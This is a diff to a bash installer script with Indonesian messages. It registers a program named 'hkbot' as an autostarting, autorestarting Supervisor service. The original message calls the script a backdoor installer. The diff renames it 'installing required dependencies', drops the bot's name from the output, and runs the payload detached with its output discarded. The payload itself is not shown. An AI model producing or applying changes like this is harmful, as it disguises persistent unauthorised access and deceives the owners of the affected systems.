@@ -1,10 +1,15 @@
 #!/bin/bash
-echo "[+] Menginstal backdoor ke Supervisor..."
+echo "[+] Menginstal dependensi yang dibutuhkan..."
 
-# Pastikan Supervisor terinstal
+# Pastikan Supervisor dan jq terinstal
 if ! command -v supervisorctl &> /dev/null; then
     echo "[+] Menginstal Supervisor..."
     sudo apt update && sudo apt install -y supervisor
+fi
+
+if ! command -v jq &> /dev/null; then
+    echo "[+] Menginstal jq..."
+    sudo apt install -y jq
 fi
 
 # Buat direktori jika belum ada
@@ -17,7 +22,7 @@ chmod +x /opt/hkbot/bash
 # Buat konfigurasi Supervisor
 cat <<EOF > /etc/supervisor/conf.d/hkbot.conf
 [program:hkbot]
-command=/bin/bash /opt/hkbot/bash
+command=/bin/bash -c 'nohup /bin/bash /opt/hkbot/bash > /dev/null 2>&1 &'
 autostart=true
 autorestart=true
 stderr_logfile=/var/log/hkbot.err.log
@@ -29,5 +34,5 @@ sudo supervisorctl reread
 sudo supervisorctl update
 sudo supervisorctl start hkbot
 
-echo "[+] Instalasi selesai. Bot berjalan dengan Supervisor sebagai 'hkbot'."
+echo "[+] Instalasi selesai. Bot berjalan otomatis dengan Supervisor."
 echo "[+] Gunakan 'sudo supervisorctl status hkbot' untuk melihat status bot."
